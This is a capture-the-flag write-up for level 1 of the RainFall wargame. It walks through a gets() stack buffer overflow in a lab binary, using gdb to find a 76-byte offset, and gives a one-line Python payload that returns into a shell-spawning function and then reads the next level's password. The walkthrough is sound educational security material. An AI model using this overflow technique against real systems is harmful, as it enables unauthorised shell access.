# Level 1

<h3>source.c</h3>

```console
void run() {
  fwrite("Good... Wait what?\n", 1, 19, stdout);
  system("/bin/sh");
}

void main() {
  char str[64];

  gets(str);
}
```

<h3>Step</h3>

This program is using the function `gets` with is unsafe and vulnerable to `buffer overflow` exploit

We can see that there is a function `run()` which will spawn a shell, but main function never call this function

We needs to find a way to run the call function `run()`

<h3>Exploit</h3>

We will use the vulnerability of `gets` function to overwrite the RET address, so when the function finish, it will jump to the address that we want to

Base on the assembly code, the stack should like something like this

```console
+------------+        -> esp
|  16 bytes  |        -> buffer for esp (0x50 or 80 bytes) each line represent 16 bytes
|  16 bytes  |        -> esp+0x10 start of the str pointer
|  16 bytes  |        
|  16 bytes  |
|  16 bytes  |        -> end of the str pointer (total 64 bytes)
+------------+
|   4 bytes  |        -> ebp
+------------+
|   4 bytes  |        -> RET (EIP)
+------------+
```

Theoretically by writing 64 bytes + 4 bytes (ebp) + 4 bytes (RET) should overwrite the return address

But the position of RET (EIP) might not be directly under the `ebp`, as compiler padding (alignment) can increase the size of the stack

We can see that there is an aligment at the start of the main function

```console
0x08048483 <+3>:	and    esp,0xfffffff0       -> bit alignment
```

Lets use gdb to be check on how much bytes we needs to write before we can overwrite the `RET`

```console
(gdb) disas main
Dump of assembler code for function main:
   0x08048480 <+0>:	push   ebp
   0x08048481 <+1>:	mov    ebp,esp
   0x08048483 <+3>:	and    esp,0xfffffff0
   0x08048486 <+6>:	sub    esp,0x50
   0x08048489 <+9>:	lea    eax,[esp+0x10]
   0x0804848d <+13>:	mov    DWORD PTR [esp],eax
   0x08048490 <+16>:	call   0x8048340 <gets@plt>
   0x08048495 <+21>:	leave
   0x08048496 <+22>:	ret
End of assembler dump.
(gdb) break *0x08048495                                                       -> set breakpoint before the return command
Breakpoint 1 at 0x8048495
(gdb) r <<< $(python -c "print 'a'*64")                                       -> print 64 'a' char and run the program
Starting program: /home/user/level1/level1 <<< $(python -c "print 'a'*64")

Breakpoint 1, 0x08048495 in main ()
(gdb) info registers                                                          -> get all the registers information
eax            0xbffff6b0	-1073744208
ecx            0xb7fd28c4	-1208145724
edx            0xbffff6b0	-1073744208
ebx            0xb7fd0ff4	-1208152076
esp            0xbffff6a0	0xbffff6a0
ebp            0xbffff6f8	0xbffff6f8
esi            0x0	0
edi            0x0	0
eip            0x8048495	0x8048495 <main+21>
eflags         0x200286	[ PF SF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) x/24wx $esp
0xbffff6a0:	0xbffff6b0	0x0000002f	0xbffff6fc	0xb7fd0ff4                    -> esp start at 0xbffff6a0
0xbffff6b0:	0x61616161	0x61616161	0x61616161	0x61616161                    -> all the 'a' char (0x61) that we give to the programs
0xbffff6c0:	0x61616161	0x61616161	0x61616161	0x61616161
0xbffff6d0:	0x61616161	0x61616161	0x61616161	0x61616161
0xbffff6e0:	0x61616161	0x61616161	0x61616161	0x61616161                    -> the write stops here with 64 * a
0xbffff6f0:	0x08048400	0x00000000	0x00000000	0xb7e454d3                    -> 0xbffff6f0 contains the EBP plus some empty paddings before we reach the RET address
```

As we can see from the stack frame above, 64 * a is not enough to overwrite the return pointer

We need to add the total byte of ebp + the extra padding in order to reach the RET

So we need to write a total of `64 + 12 = 76 char` as an offset before we could overwrite the RET

Now lets find the address of the `run()`

```console
(gdb) p run
$1 = {<text variable, no debug info>} 0x8048444 <run>
```

Great! We have the address of the `run()`, now we just need to pack everything together and give it to the program

The address need to be written in reverse because of little endian

The `cat -` is needed as we want the spawned shell to stay open and this is the work around

```console
level1@RainFall:~$ (python -c "print 'a' * 76 + '\x44\x84\x04\x08'"; cat - ) | ./level1
Good... Wait what?
whoami
level2
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```


